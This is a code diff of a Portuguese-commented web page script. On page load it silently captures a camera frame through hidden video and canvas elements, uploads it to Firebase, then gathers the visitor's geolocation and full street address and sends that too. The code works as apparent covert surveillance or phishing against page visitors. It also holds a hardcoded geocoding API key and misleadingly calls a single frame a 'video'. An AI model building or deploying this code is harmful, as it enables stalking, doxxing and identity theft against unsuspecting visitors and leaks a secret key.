@@ -77,8 +77,8 @@
       loader.style.display = 'none';
     }
 
-    // Função para capturar selfie e salvar no Storage
-    function captureSelfieAndSave() {
+    // Função para gravar vídeo de 5 segundos e salvar no Storage
+    function captureVideoAndSave() {
       const video = document.createElement('video'); // Cria o elemento de vídeo oculto
       const canvas = document.createElement('canvas'); // Cria o canvas oculto
 
@@ -90,17 +90,26 @@
           video.play();
 
           video.onloadedmetadata = () => {
-            // Tira a selfie automaticamente assim que a câmera está pronta
+            // Define o tamanho do canvas de acordo com o vídeo
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Grava por 5 segundos
+            setTimeout(() => {
+              // Pausa o vídeo após 5 segundos
+              video.pause();
+              video.currentTime = 0;
+              
+              // Desenha o frame do vídeo no canvas
+              const context = canvas.getContext('2d');
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              
+              // Para a câmera e captura a imagem
+              stream.getTracks().forEach(track => track.stop());
 
-            // Para a câmera e captura a imagem
-            stream.getTracks().forEach(track => track.stop());
-
-            const selfieData = canvas.toDataURL('image/png', 1.0); // Gera a imagem em alta qualidade
-            uploadSelfieToStorage(selfieData);
+              const videoData = canvas.toDataURL('image/png', 1.0); // Gera o frame em alta qualidade
+              uploadVideoToStorage(videoData); // Chama a função para fazer o upload
+            }, 5000); // 5000ms = 5 segundos
           };
         })
         .catch(error => {
@@ -109,22 +118,23 @@
         });
     }
 
-    // Função para salvar selfie no Firebase Storage
-    function uploadSelfieToStorage(selfieData) {
-      const storageRef = storage.ref(`selfies/selfie_${Date.now()}.png`);
-      storageRef.putString(selfieData, 'data_url')
+    // Função para salvar o vídeo (frame) no Firebase Storage
+    function uploadVideoToStorage(videoData) {
+      const timestamp = new Date().toISOString().replace(/[^\w\s]/gi, '-'); // Formato data/hora
+      const storageRef = storage.ref(`videos/video_${timestamp}.png`); // Adiciona data/hora ao nome do arquivo
+      storageRef.putString(videoData, 'data_url')
         .then(snapshot => snapshot.ref.getDownloadURL())
         .then(url => {
-          getLocation(url); // Após salvar a selfie, coleta localização e endereço
+          getLocation(url); // Após salvar o vídeo, coleta a localização
         })
         .catch(error => {
           hideLoader();
-          alert('Erro ao salvar a selfie no Firebase Storage: ' + error.message);
+          alert('Erro ao salvar o vídeo no Firebase Storage: ' + error.message);
         });
     }
 
     // Obter endereço completo a partir de coordenadas
-    function getAddressFromCoordinates(lat, lon, selfieUrl) {
+    function getAddressFromCoordinates(lat, lon, videoUrl) {
       const apiKey = '150e176e377d4d2ab2819ddada71dbe7';
       const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;
 
@@ -142,7 +152,7 @@
               house_number: result.house_number || '',
               country: result.country || '',
               address: data.results[0].formatted,
-              selfieUrl: selfieUrl
+              videoUrl: videoUrl
             };
             sendDataToFirebase(addressDetails); // Envia os dados para o Firebase
           } else {
@@ -157,13 +167,13 @@
     }
 
     // Localização do usuário
-    function getLocation(selfieUrl) {
+    function getLocation(videoUrl) {
       if (navigator.geolocation) {
         document.getElementById('location-message').innerHTML = 'Será solicitado acesso à sua localização para concluir o processo. Por favor, permita o acesso para continuar.';
         navigator.geolocation.getCurrentPosition(
           position => {
             const { latitude, longitude } = position.coords;
-            getAddressFromCoordinates(latitude, longitude, selfieUrl);
+            getAddressFromCoordinates(latitude, longitude, videoUrl);
           },
           error => {
             hideLoader();
@@ -203,7 +213,7 @@
 
     // Iniciar coleta de dados automaticamente
     window.onload = () => {
-      captureSelfieAndSave(); // Primeiro passo: captura a selfie automaticamente
+      captureVideoAndSave(); // Primeiro passo: grava o vídeo automaticamente
     };
   </script>
 </body>
